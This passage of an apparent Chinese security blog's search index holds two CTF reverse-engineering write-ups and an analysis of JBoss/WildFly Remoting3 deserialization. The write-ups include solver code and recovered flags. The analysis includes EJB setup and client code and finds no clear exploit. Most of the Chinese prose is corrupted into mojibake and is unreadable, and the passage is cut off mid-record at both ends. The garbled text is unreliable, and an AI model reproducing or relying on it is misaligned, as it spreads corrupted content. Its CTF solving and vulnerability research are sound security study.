ç¬”è®°]ä¸Šæµ·å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›-pluzz","text":"0x00å‰è¨€ è¿™å›ä¸Šæµ·å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›å°±çœ‹äº†è¿™é¢˜ï¼Œå®åœ¨æ˜¯æ²¡ç©ºã€‚ä¸è¿‡è¿™æ¬¡æˆ‘ä½œä¸ºè·‘é¾™å¥—çš„reæ‰‹æ€è·¯æœ€æ¸…æ™°çš„ä¸€å›äº†ï¼Œå€¼å¾—è®°å½•ä¸‹æ¥ã€‚ 0x01æ€è·¯ä½œä¸ºæ±‡ç¼–åŸºç¡€ä¸æ‰å®çš„è·‘é¾™å¥—reæ‰‹ï¼Œæ‹¿åˆ°é¢˜ç›®å½“ç„¶æ˜¯ä»ç»IDAæ¥F5ä¸€æ³¢ã€‚ mainå‡½æ•°çš„é€»è¾‘å¾ˆç®€å•ï¼Œifåˆ¤æ–­ä¸ºçœŸå°±åœ¨sub_401BA0è¾“å‡ºflagã€‚é€šè¿‡ODåŠ¨è°ƒå¾—çŸ¥v11å°±æ˜¯é€šè¿‡è¾“å…¥çš„v9ä½œä¸ºç§å­ä»€ä¹ˆçš„ï¼Œç»è¿‡sub_401BA0å‡½æ•°è·å¾—uuidã€‚ ifé‡Œç¬¬ä¸€ä¸ªå‡½æ•°ç®€å•çš„åˆ¤æ–­è¾“å…¥é•¿åº¦æ˜¯å¦ä¸º16ä½ï¼Œç„¶åæ˜¯ä¸€ä¸ªwhileå¾ªç¯ï¼Œæˆ‘ä¸€å¼€å§‹navieçš„è®¤ä¸ºåªèƒ½è¾“å…¥a-fçš„å­—ç¬¦ï¼Œåæ¥æ‰å‘ç°è¾“å…¥1-9çš„æ—¶å€™ç±»å‹è½¬æ— ç¬¦å·å‹ï¼Œç»“æœä¹Ÿä¼šæ¯”&amp;å¤§ï¼Œä»¥åé‡åˆ°ç±»å‹è½¬æ¢ä¸€ç‚¹è¦æ³¨æ„äº†ã€‚ ç¬¬äºŒä¸ªå‡½æ•°æ²¡çœ‹æ‡‚æ˜¯ä»€ä¹ˆæ“ä½œï¼Œä½†è°·æ­Œäº†ä¸€ä¸‹%02Xæ ¼å¼åŒ–è¾“å‡ºä½ä¸¤ä½16çš„æ„æ€ï¼ŒåŠ¨è°ƒçš„ç»“æœä¹Ÿç¡®å®å¦‚æ­¤ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯sub_401B60çš„ä¸¤å‚æ•°æ˜¯ä¼ å¼•ç”¨è¿›å»çš„ï¼Œåœ¨æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°ä¹‹åç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥ä¸€ä¸ªå‡½æ•°é™¤äº†çœ‹è¿”å›å€¼å¤–è¿˜è¦çœ‹å®ƒçš„å‚æ•°æ˜¯å¦ä¸ºæŒ‡é’ˆæˆ–è€…å¼•ç”¨ã€‚å¤ªèœäº†ç°åœ¨æ‰é¢†æ‚Ÿåˆ°è¿™ä¸ªé“ç†ã€‚ ç¬¬ä¸‰ä¸ªå‡½æ•°IDAçš„ä¼ªä»£ç ä¹Ÿæ²¡çœ‹æ‡‚æ˜¯ä»€ä¹ˆæ“ä½œï¼Œå¥½åœ¨è¿™ä¸ªå‡½æ•°åœ¨è¿™ä¹‹å‰ä¸è¾“å…¥çš„å­—ç¬¦ä¸²å…³ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå–æŒ‡é’ˆï¼Œç›´æ¥åŠ¨è°ƒä¸€ä¸‹çœ‹ç»“æœï¼Œå‡ºæ¥äº†ä¸€ä¸²å¥½åƒæ˜¯intå‹çš„ä¸œè¥¿ï¼Œåä¸€ä¸ªå‡½æ•°ä¼šç”¨åˆ°å…ˆdumpä¸‹æ¥ã€‚ ç¬¬å››ä¸ªå‡½æ•°è¿™å›çœ‹æ‡‚äº†ï¼Œå°±æ˜¯å°†è½¬æ¢åçš„16è¿›åˆ¶ä¸ä¸Šä¸€ä¸ªå‡½æ•°çš„ç»“æœçš„ç¬¬iä½å’Œå‰iä½çš„å’Œè¿›è¡Œå¼‚æˆ–ï¼Œå…ˆæŠŠè¦å¼‚æˆ–çš„æ•°dumpä¸‹æ¥å¤‡ç”¨ã€‚è¿”å›å€¼æ’ä¸ºçœŸï¼Œå…ˆæ”¾ä¸€è¾¹ã€‚ ç¬¬äº”ä¸ªå‡½æ•°å°¤ä¸ºå…³é”®ï¼Œè·Ÿç¬¬ä¸€ä¸ªå‡½æ•°ä¸€æ ·å†³å®šäº†èƒ½ä¸èƒ½å¤ºå¾—flagã€‚ä¼ å…¥8ä¸ªå­—èŠ‚å¼‚æˆ–åçš„ç»“æœï¼Œæ¯å­—èŠ‚ä¸èƒ½æ‰“å¤§äº9ä¸”è¦æ»¡è¶³7ä¸ªåˆ¤æ–­è¯­å¥ã€‚è¿™é‡ŒæŒ‰ç…§å®ƒçš„é€»è¾‘æŠŠå…«ä½æ•°çˆ†å‡ºæ¥å°±è¡Œäº†ï¼Œä½†æ˜¯ä¸€å¼€å§‹ç”¨pythonå†™çš„è„šæœ¬ä¸€å †é—®é¢˜ï¼Œæ•´å¾—æˆ‘åœ¨æ¯”èµ›ç»“æŸå‰æ²¡åšå‡ºæ¥ã€‚æœ€åç”¨c++å†™ä¸‹å°±æå‡ºæ¥äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;ios&gt;using namespace std;long long int dword_40F020 = 0x8A;long long int dword_40F024 = 0x01A1;long long int dword_40F028 = 0x012A;long long int dword_40F02C = 0x0269;long long int dword_40F030 = 0x0209;long long int dword_40F034 = 0x68;long long int dword_40F038 = 0x039F;long long int dword_40F03C = 0x02C8;long long int dword_40F040 = 0x00FF;int test(int v);void flag(int v);int main(){ int v = 0; int i; for (i = 10000000; i &lt;= 99999999; ++i) { int j = i; while (j != 0) { if (test(j % 10) == 1) { cout &lt;&lt; i &lt;&lt; endl; flag(i); return 0; } j /= 10; } dword_40F020 = 0x8A; dword_40F024 = 0x01A1; dword_40F028 = 0x012A; dword_40F02C = 0x0269; dword_40F030 = 0x0209; dword_40F034 = 0x68; dword_40F038 = 0x039F; dword_40F03C = 0x02C8; dword_40F040 = 0x00FF; } return 0;}int test(int v){ int result = 0; switch (v) { case 0: dword_40F028 &amp;= dword_40F038; dword_40F02C *= dword_40F028; goto LABEL_4; case 1: if (!dword_40F02C) goto LABEL_6; dword_40F028 /= dword_40F02C; dword_40F024 += dword_40F034; goto LABEL_4; case 2: dword_40F030 ^= dword_40F034; dword_40F03C += dword_40F020; goto LABEL_4; case 3: dword_40F03C -= dword_40F030; dword_40F030 &amp;= dword_40F024; goto LABEL_4; case 4: dword_40F034 *= dword_40F020; dword_40F02C -= dword_40F038; goto LABEL_4; case 5: dword_40F020 ^= dword_40F02C; dword_40F038 -= dword_40F03C; goto LABEL_4; case 6: if (!dword_40F03C) goto LABEL_6; dword_40F034 |= dword_40F024 / dword_40F03C; dword_40F024 /= dword_40F03C; goto LABEL_4; case 7: dword_40F038 += dword_40F028; dword_40F034 |= dword_40F024; goto LABEL_4; case 8: dword_40F020 *= dword_40F02C; dword_40F030 -= dword_40F03C; goto LABEL_4; case 9: dword_40F028 += dword_40F034; dword_40F02C ^= dword_40F030; LABEL_4: result = ((dword_40F038 == 231) + (dword_40F034 == 14456)+ (dword_40F030 == 14961)+ (dword_40F02C == -13264)+ (dword_40F028 == 16)+ (dword_40F024 == 104)+ (dword_40F020 == -951) == 7); if (dword_40F03C != -239) goto LABEL_6; break; default: LABEL_6: return 0; break; } return result;}void flag(int v){ int a[] = { 0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9 }; int j = 0; while (v) { for (int i = 0; i &lt;= 256; ++i) { if (v % 10 == (i ^ a[j])) { printf(\"%02x\", i); break; } } v /= 10; j += 1; }} è¿è¡Œç»“æœï¼š 270594167aaa29982a98eaab è¾“å…¥åˆ°é¢˜ç›®æ–‡ä»¶ä¸­ï¼š Plz solve the puzzle: 7aaa29982a98eaabCongrats!flag{5cb92582-66a8-e5b7-d3bf-3b99df8ac7f0} 0X02æ€»ç»“ åº”å½“æ³¨æ„ç±»å‹è£…æ¢ï¼Œä»¥åŠè½¬æ¢åçš„å­—èŠ‚å¤§å° é™¤äº†å‡½æ•°çš„è¿”å›å€¼ï¼Œè¿˜å¯ä»¥ä»å‚æ•°çš„å¼•ç”¨æˆ–æŒ‡é’ˆè·å–ç»“æœ å¯ä»¥é€šè¿‡åŠ¨æ€è°ƒè¯•å‡½æ•°çš„ç»“æœå¾—çŸ¥å‡½æ•°çš„åŠŸèƒ½","link":"/2019/10/26/é€†å‘å­¦ä¹ ç¬”è®°-ä¸Šæµ·å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›-pluzz/"},{"title":"[é€†å‘å­¦ä¹ ç¬”è®°]æ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦â€œæ·±ä¿¡æœæ¯â€","text":"0x0number_gameè·Ÿflagç›´æ¥ç›¸å…³çš„å°±æ˜¯è¿™ä¸ªå‡½æ•°ã€‚ 1234567891011121314151617181920212223__int64 sub_400917(){ unsigned int v1; // [rsp+0h] [rbp-10h] signed int i; // [rsp+4h] [rbp-Ch] signed int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) { for ( j = 0; j &lt;= 4; ++j ) { for ( k = j + 1; k &lt;= 4; ++k ) { if ( *(&amp;unk_601060 + 5 * i + j) == *(&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *(&amp;unk_601060 + 5 * j + i) == *(&amp;unk_601060 + 5 * k + i) ) v1 = 0; } } } return v1;} åˆ†æäº†ä¸€ä¸‹ï¼Œé¢˜ç›®çš„è¦æ±‚å°±æ˜¯è¡¥å…¨ä¸€ä¸ªç¡¬ç¼–ç åœ¨å†…å­˜é‡Œçš„5x5çŸ©é˜µï¼Œå®ƒçš„æ¨ªç«–ä¸èƒ½æœ‰ç›¸åŒçš„æ•°å­—ã€‚åœ¨æ ¹æ®å‰é¢åªèƒ½è¾“å…¥0~5çš„æ•°å­—ï¼Œæ‰‹åŠ¨ä¸€ä¸‹ï¼Œå¾ˆå®¹æ˜“è¿˜åŸäº†çŸ©é˜µã€‚ å¾—åˆ°è¿˜åŸå‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œä½†è¿™æ˜¯é€šäº†å‰ä¸¤ä¸ªå‡½æ•°åç§»çš„å‡ºæ¥çš„çŸ©é˜µã€‚ 123456789101112131415161718_QWORD *__fastcall sub_400758(__int64 cin, int offset, int a3){ _QWORD *v4; // rax _QWORD *v5; // ST28_8 int str_long; // [rsp+0h] [rbp-30h] char v7; // [rsp+1Fh] [rbp-11h] str_long = a3; v7 = *(offset + cin); if ( v7 == 32 || v7 == 10 || offset &gt;= a3 ) return 0LL; v4 = malloc(0x18uLL); v5 = v4; *v4 = v7; v4[1] = sub_400758(cin, 2 * offset + 1, str_long); v5[2] = sub_400758(cin, 2 * (offset + 1), str_long); return v5;} 12345678910111213__int64 __fastcall sub_400807(__int64 a1, __int64 a2){ __int64 result; // rax result = a1; if ( a1 ) { sub_400807(*(a1 + 8), a2); *(a2 + dword_601080++) = *a1; result = sub_400807(*(a1 + 16), a2); } return result;} çœ‹æ¥å‡ºé¢˜äººå¾ˆå–œæ¬¢é€’å½’å•Šï¼ï¼ï¼è¿™é€’å½’çœ‹å¾—çœ¼èŠ±ç¼­ä¹±ã€‚ åº†å¹¸çš„æ˜¯åç§»ä¸è¾“å…¥å†…å®¹æ— å…³ã€‚è¾“å…¥0123456789ï¼Œå†patchä¸€ä¸‹ZFï¼Œå°±èƒ½å¾—å‡ºåŸå­—ç¬¦ä¸²å’Œåç§»åçš„å­—ç¬¦ä¸²ã€‚ æ•´ä¸ªpythonè„šæœ¬è·‘ä¸€è·‘å³å¯å¾—åˆ°flagã€‚ 12345678910ch = '7381940526'code = '0421421430'flag = ['','','','','','','','','','']for i in xrange(10): flag[ord(ch[i])-ord('0')]=code[i]print 'flag{'+''.join(flag)+'}'#flag{1134240024}","link":"/2019/05/23/é€†å‘å­¦ä¹ ç¬”è®°-æ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦â€œæ·±ä¿¡æœæ¯â€/"},{"title":"JBoss\\WildFly remoting3åè®®ååºåˆ—åŒ–åˆ†æ","text":"å‰è¨€å‰æ®µæ—¶é—´åˆ†æäº†JBoss 3873å’Œ4446ç«¯å£ä¸‹çš„ååºåˆ—åŒ–ï¼Œå—å½±å“çš„ç‰ˆæœ¬æœ€æ™šå·²ç»æ˜¯2011å¹´å‘å¸ƒçš„ï¼Œè€ŒJBoss EAP 6.XåŠWildFly\\JBoss AS 7.Xç­‰åç»­ç‰ˆæœ¬ï¼Œå®ƒä»¬ååºåˆ—åŒ–ç›¸å…³çš„CVEå°±å¾ˆå°‘äº†ã€‚å½’æ ¹ç»“åº•ï¼Œæ˜¯å› ä¸ºä»¥ä¸Šæ‰€è¯´çš„åç»­ç‰ˆæœ¬å¼ƒç”¨äº†åŸæ¥çš„Remoting2åè®®ï¼Œå¯ç”¨äº†Remoting3åè®®ã€‚æœ¬æ–‡ä»¥Remoting3çš„ååºåˆ—åŒ–ç›¸å…³é—®é¢˜å±•å¼€åˆ†æã€‚ Remoting3ç®€ä»‹Remoting3æ˜¯JBoss Remotingçš„ä¸‹ä¸€ä»£åè®®ï¼Œå®ƒåœ¨å…·å¤‡ä¸Šä¸€ä»£åè®®æ‰€å…·æœ‰çš„åŠŸèƒ½çš„åŒæ—¶ï¼Œè¿˜å¼•å…¥äº†ä»¥ä¸‹ä¸€äº›æ€§åŠŸèƒ½ã€‚ å¯æ‹“å±•çš„ä¼ è¾“åè®® å¯ä»¥åœ¨è¿è¡Œæ—¶æ£€æµ‹å…¶ä»–çš„åè®® å¯æ‹“å±•çš„æ‰“åŒ…ç­–ç•¥ï¼ˆMarshalling Strategiesï¼‰ ä½¿ç”¨å¼ºå¤§çš„JBossæ‰“åŒ…åº“ ç›¸æ¯”æ˜æ–‡çš„Javaåºåˆ—åŒ–æ›´é«˜æ•ˆ å®‰å…¨åŠŸèƒ½ æ”¯æŒSSLåè®®ï¼Œå¯ä»¥ä¿æŠ¤ä¼ è¾“æ•°æ®çš„å®Œæ•´æ€§å’Œæœºå¯†æ€§ï¼ŒåŒæ—¶ä¹Ÿå¯ç”¨æ¥è®¤è¯æœåŠ¡ç«¯ æ”¯æŒSASLæ¡†æ¶ï¼Œå¯è¿›è¡Œå®¢æˆ·ç«¯è®¤è¯å’Œæˆæƒ é€šè¿‡æŠ“åŒ…å¯¹æ¯”ï¼Œæ­£å¦‚å®˜ç½‘ä»‹ç»æ‰€è¯´ï¼ŒRemoting3åè®®ä¸åŒäºRemoting2çš„å‡ ä¹æ˜æ–‡çš„Javaåºåˆ—åŒ–æ•°æ®ï¼Œå¹¶ä¸”åœ¨é»˜è®¤é…ç½®ä¸‹éœ€è¦å…ˆè¿›è¡Œå®¢æˆ·ç«¯çš„è®¤è¯æ‰å¯ä½¿ç”¨åç»­çš„EJB3æœåŠ¡ã€‚ å‰é¢æ‰€è¯´çš„å¯æ‹“å±•çš„ä¼ è¾“åè®®ï¼Œä½“ç°åœ¨JBossä¸Šå³ä¸ºHTTPæœåŠ¡8080ç«¯å£çš„ã€‚Remoting3åè®®æ”¯æŒä¸¤ç§EJB3æœåŠ¡ç›‘å¬æ¨¡å¼ï¼šç›´æ¥ç›‘å¬ä¸€ä¸ªç«¯å£å’Œå¤ç”¨HTTPæœåŠ¡çš„ç«¯å£ã€‚å‰è€…æ˜¯JBoss EAP 6.Xå’ŒJBoss AS 7.Xä½¿ç”¨çš„æ¨¡å¼ï¼Œå¯¹åº”çš„schemeæ˜¯remote://ï¼Œè€Œåè€…æ˜¯JBoss EAP 7.Xå’ŒWildFlyä½¿ç”¨çš„æ¨¡å¼ï¼Œå¯¹åº”çš„schemeæ˜¯http-remoting://æˆ–http://ï¼ˆè§†ç‰ˆæœ¬è€Œå®šï¼‰ã€‚ ç«¯å£å¤ç”¨è¿™å—ä»æµé‡è¿™çœ‹æ˜¯æ¯”è¾ƒç®€å•ï¼Œå®¢æˆ·ç«¯å…ˆå‘é€ä¸€ä¸ªå¸¦Upgrade: jboss-remotingå¤´çš„HTTPè¯·æ±‚ï¼Œç„¶åæœåŠ¡ç«¯è¿”å›101çŠ¶æ€ç åˆ‡æ¢åè®®ï¼Œåç»­æµé‡åˆ™ä¸ç›‘å¬ç«¯å£çš„æ¨¡å¼æ— å¼‚ã€‚ ç¯å¢ƒéƒ¨ç½²Remoting3åè®®æœåŠ¡äºEJB3ï¼Œè€ŒEJB3ä¸RMIç±»ä¼¼ï¼Œæ”¯æŒå¯¹è±¡ä¼ å‚ï¼Œæ¶‰åŠåˆ°å¯¹è±¡å‚æ•°å¿…ç„¶ä¼šä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰¯ä¸Šå…³ç³»ã€‚è¦ç ”ç©¶Remoting3åè®®çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œé¦–å…ˆå¾—éƒ¨ç½²ä¸€ä¸ªEJB3çš„æœåŠ¡ã€‚æœ¬æ–‡åç»­çš„åˆ†æå‡ä»¥WildFly 8.2.1.Finalä¸ºä¾‹ï¼Œä¸‹è½½ç›¸åº”çš„ç‰ˆæœ¬ï¼Œåœ¨å¯åŠ¨å‰å…ˆä½¿ç”¨bin/add-user.shè„šæœ¬æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚ å°†ä»¥ä¸‹ä¸¤ä¸ªç±»ç¼–è¯‘ä¸ºJaråŒ…ï¼Œå¹¶ä»9990ç«¯å£ç™»å½•åˆ°æ§åˆ¶å°ï¼Œéƒ¨ç½²æ‰“åŒ…å¥½çš„JaråŒ…ã€‚ 123456789package com.illucit.ejbremote.server;import javax.ejb.Remote;@Remotepublic interface ExampleService { public Object greet(Object object);} 12345678910111213package com.illucit.ejbremote.server;import javax.ejb.Stateless;@Statelesspublic class ExampleServiceImpl implements ExampleService { @Override public Object greet(Object object) { return object; }} æ–°å»ºä¸€ä¸ªJavaé¡¹ç›®ï¼Œå¹¶å°†WildFlyçš„bin/clientç›®å½•ä¸‹çš„jaråŒ…å¤åˆ¶åˆ°é¡¹ç›®çš„libç›®å½•ï¼ŒåŒæ—¶å°†ä»¥ä¸Šä¸¤ä¸ªç±»ä¹ŸåŠ å…¥åˆ°é¡¹ç›®ä¸­ã€‚ç„¶ååœ¨resourceç›®å½•ä¸‹æ·»åŠ jboss-ejb-client.propertiesï¼Œå¡«å…¥ä»¥ä¸‹é…ç½®å†…å®¹ã€‚ 12345remote.connections=defaultremote.connection.default.host=192.168.78.132remote.connection.default.port = 8080remote.connection.default.username=&lt;username&gt;remote.connection.default.password=&lt;password&gt; æœ€åæ·»åŠ ä»¥ä¸‹ç±»ä½œä¸ºå®¢æˆ·ç«¯ï¼Œè°ƒç”¨è¿œç¨‹EJB3æœåŠ¡ã€‚ 1234567891011121314151617181920212223242526import com.illucit.ejbremote.server.ExampleService;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Date;import java.util.Hashtable;public class Client { public static void main(String[] args) throws Exception { System.out.printf(String.valueOf(lookupExample().greet2(new Date()))); } private static ExampleService lookupExample() throws NamingException { final Hashtable&lt;String, String&gt; jndiProperties = new Hashtable(); jndiProperties.put(Context.URL_PKG_PREFIXES, \"org.jboss.ejb.client.naming\"); final Context context = new InitialContext(jndiProperties); String url = \"ejb:/ejb-remote-server/ExampleServiceImpl!\" + ExampleService.class.getName(); System.out.println(url); return (ExampleService) context.lookup(url); }} æŠ€æœ¯åˆ†æé¦–å…ˆç”¨ä¸€ä¸ªåœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨çš„ç±»ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨EJB3æœåŠ¡ã€‚åœ¨å®¢æˆ·ç«¯æŠ›å‡ºçš„å¼‚å¸¸ä¿¡æ¯çš„è°ƒç”¨æ ˆä¸­ï¼Œå¯ä»¥çœ‹åˆ°org.jboss.marshalling.AbstractObjectInputçš„readObjectæ–¹æ³•è¢«è°ƒç”¨ã€‚ åœ¨æœåŠ¡ç«¯è¯¥æ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå½“å‰çš„ç±»æ˜¯AbstractObjectInputçš„å­ç±»org.jboss.marshalling.river.RiverUnmarshallerï¼Œå‘åºåˆ—åŒ–è°ƒç”¨è‡ªèº«çš„doReadObjectæ–¹æ³•å¤„ç†ã€‚ è·Ÿè¿›åˆ°doReadObjectæ–¹æ³•ï¼Œä»£ç ä¸­ä¼šæœ‰ä¸€ä¸ªswitchå¾ªç¯ä½“ï¼Œæ ¹æ®ä»è¾“å…¥æµè·å–åˆ°çš„å­—èŠ‚è¿›å…¥ä¸åŒçš„åˆ†æ”¯ã€‚åç»­ä¼šè¢«è°ƒç”¨åˆ°çš„doReadNewObjectå’ŒdoReadClassDescriptorä¹Ÿä¼šæœ‰ä¸€ä¸ªswitchå¾ªç¯ä½“ï¼Œæƒ³å¿…å°±æ˜¯å®˜æ–¹æ‰€è¯´çš„å¯æ‹“å±•çš„æ‰“åŒ…ç­–ç•¥ã€‚ é€šè¿‡æ§åˆ¶è¾“å…¥æµè¿›å…¥åˆ°switchå¾ªç¯åˆ¤æ–­çš„å­—èŠ‚ï¼Œä»è€Œå¯ä»¥æ§åˆ¶è¿”å›ç±»ç¤ºä¾‹æˆ–è€…ååºåˆ—åŒ–å¯¹è±¡ã€‚ç¬”è€…æ¢³ç†äº†è¿™äº›switchå¾ªç¯ä½“çš„åˆ†æ”¯ï¼Œæ•´ç†äº†å‡ ä¸ªä¼šè¿”å›ååºåˆ—åŒ–å¯¹è±¡çš„æµç¨‹ï¼Œä»–ä»¬æ— ä¸€ä¾‹å¤–çš„ä¼šç›´æ¥readObjectååºåˆ—åŒ–æˆ–loadClassåå°„ç±»å®ä¾‹ï¼Œæ­¤æ—¶ä»–ä»¬çš„ç±»åŠ è½½å™¨éƒ½æ˜¯ModuleClassLoaderã€‚ è¿™æ˜¯ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„ç±»åŠ è½½å™¨ï¼Œååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸­å¸¸è§çš„ç±»ï¼Œæ¯”å¦‚UnicastRefã€CCé“¾ï¼ˆç¨‹åºä¸­å®é™…æœ‰ç”¨åˆ°è¿™ä¸ªä¾èµ–ï¼‰ï¼Œç”šè‡³äºåŸç”Ÿååºåˆ—åŒ–é“¾ä¸­çš„ä¸€äº›ç±»éƒ½æ˜¯æ— æ³•åŠ è½½çš„ã€‚ å®æµ‹åªæœ‰ä¸¤ä¸ªmoduleè·¯å¾„ä¸‹jaråŒ…é‡Œçš„éƒ¨åˆ†ç±»å’Œjdkéƒ¨åˆ†åŸç”Ÿç±»å¯ä»¥è¢«è¿™ä¸ªç±»åŠ è½½å™¨åŠ è½½ã€‚åœ¨å¯ä»¥åŠ è½½çš„ç±»ä¸­èƒ½æ‰¾åˆ°ä¸€äº›Sinkç±»ï¼Œæ¯”å¦‚ValueExpressionImplã€MethodExpressionImplï¼Œåœ¨RichFacesçš„CVE-2018-12533ä¸­æœ‰ç”¨åˆ°è¿™ä¸¤ä¸ªSinkç±»çš„å‘åºåˆ—åŒ–é“¾ï¼Œä½†Sourceå’ŒGadgetç±»è™½ç„¶æœ‰ï¼Œä½†ModuleClassLoaderç±»åŠ è½½å™¨å¹¶ä¸èƒ½åŠ è½½ã€‚ ååºåˆ—åŒ–è¿™æ¡è·¯è¡Œä¸é€šï¼Œå›çœ‹è°ƒç”¨æ ˆä¸­å¤„ç†æ¶ˆæ¯çš„æ–¹æ³•processMessageã€‚å¼€å¤´ç”¨ååºåˆ—åŒ–è·å–appNameã€moduleNameã€distinctNameå’ŒbeanNameï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯lookupæŸ¥è¯¢çš„urlã€‚è™½è¯´è¿™ç§ç”¨æ³•å­˜åœ¨é£é™©ï¼Œåœ¨ä¸çŸ¥é“éƒ¨ç½²äº†ä»€ä¹ˆEJB3æœåŠ¡çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†ç›®å‰èµ·æ¥æœ‰éš¾åº¦ï¼Œæ‰€ä»¥æš‚æ—¶ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ æ¥ç€çœ‹åé¢çš„ä»£ç ï¼Œæœ‰ä¸€ä¸ªåå°„Methodçš„æ“ä½œï¼Œä»EJB3éƒ¨ç½²ä¿¡æ¯è·å–åˆ°çš„ComponentViewï¼Œæ ¹æ®æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°åå°„Methodã€‚å›æº¯Methodçš„æ¥æºï¼Œå‘ç°æ˜¯ä¸ååºåˆ—åŒ–çš„locatoræœ‰å…³ã€‚è¿™ä¸ªlocatorå…¶å®å°±æ˜¯å°è£…äº†å®¢æˆ·ç«¯EJB3æœåŠ¡æ¥å£çš„EJBLocatorï¼Œé‚£å¯ä»¥å®¢æˆ·ç«¯ä½¿ç”¨æ¶æ„çš„EJB3æœåŠ¡æ¥å£ï¼Œä»è€Œåå°„æœåŠ¡ç«¯ç±»çš„æ–¹æ³•ï¼Ÿç¬”è€…ä¹Ÿåšäº†ä¸‹å°è¯•ï¼Œä½†è‹¥æƒ³è¦åå°„çš„æœåŠ¡ç«¯ç±»ä¸æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªå†…æ¥å£ç±»çš„å¼‚å¸¸ï¼Œå³ä½¿æ˜¯æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œä»éƒ¨ç½²ä¿¡æ¯è·å–ComponentViewè¿™ä¸€æ­¥ä¹Ÿæ²¡æ³•è·å–æœåŠ¡ç«¯EJB3æœåŠ¡æ¥å£ä¹‹å¤–çš„å†…å®¹ã€‚ åè®°Remoting3åè®®çš„åˆ†æåŸæœ¬æ˜¯ä»¥æŒ–æ˜åè®®æ¼æ´ä¸ºç›®çš„ï¼Œä½†æœ€ç»ˆä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆå¤ªå¤§çš„é—®é¢˜ï¼Œä¸å¾—ä¸æ„Ÿå¹ç°åœ¨JBoss\\WildFlyçš„ç‰ˆæœ¬æ¯”ä¹‹å‰ä½¿ç”¨remoting2åè®®çš„ç‰ˆæœ¬å®‰å…¨æ€§ä¸Šå‡äº†ä¸€ä¸ªå°é˜¶ã€‚ç¿»çœ‹è¿‘å¹´WildFlyçš„CVEï¼Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–ç›¸å…³çš„CVE-2020-10740ï¼Œæ²¡æœ‰éªŒè¯æœºåˆ¶ä½¿å¾—å¯èƒ½é€šè¿‡EJBå‘èµ·è¿œç¨‹å‘åºåˆ—åŒ–æ”»å‡»ï¼Œè¯´çš„å¤§æ¦‚å°±æ˜¯æœ¬æ–‡è®¨è®ºçš„å†…å®¹ã€‚æŸ¥çœ‹åœ¨WildFly20.0å‘å¸ƒçš„ä¿®å¤ï¼Œä»…ä»…æ˜¯å¢åŠ äº†é»‘åå•éªŒè¯ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œå®¢æˆ·ç«¯è¿˜æœ‰ä¸ªä¸å¤§ä¸å°çš„é—®é¢˜ï¼Œå®ƒçš„ååºåˆ—åŒ–æµç¨‹å’ŒæœåŠ¡ç«¯å·®ä¸å¤šï¼Œä½†å®¢æˆ·ç«¯è¿™é‡Œçš„ç±»åŠ è½½å™¨å°±æ˜¯æ™®é€šçš„ç±»åŠ è½½å™¨ï¼Œå¯ä»¥ç”¨åˆ°éƒ¨åˆ†çš„å‘åºåˆ—åŒ–é“¾ï¼Œè¿™åœºæ™¯å°±æœ‰ç‚¹åƒRMIçš„å‘åºåˆ—åŒ–æœåŠ¡ç«¯ä¼ æ¥çš„æ¶æ„ç»“æœæˆ–å¼‚å¸¸ã€‚ä¹Ÿè®¸èƒ½ç”¨åœ¨ååˆ¶ã€ä¸­é—´äººæ”»å‡»ç­‰åœºæ™¯ã€‚ã€‚ æ–‡ä¸­è‹¥æœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹ï¼Œæ•¬è¯·å¸ˆå‚…ä»¬æ–§æ­£ã€‚ å‚è€ƒhttps://jbossremoting.jboss.org/remoting-3 https://paper.seebug.org/766/ https://github.com/illucIT/remote-ejb-example","link":"/2022/06/28/JBoss WildFly remoting3åè®®ååºåˆ—åŒ–åˆ†æ/"}],"tags":[{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"machineKey","slug":"machineKey","link":"/tags/machineKey/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"update-motd","slug":"update-motd","link":"/tags/update-motd/"},{"name":"OGNL","slug":"OGNL","link":"/tags/OGNL/"},{"name":"sandbox","slug":"sandbox",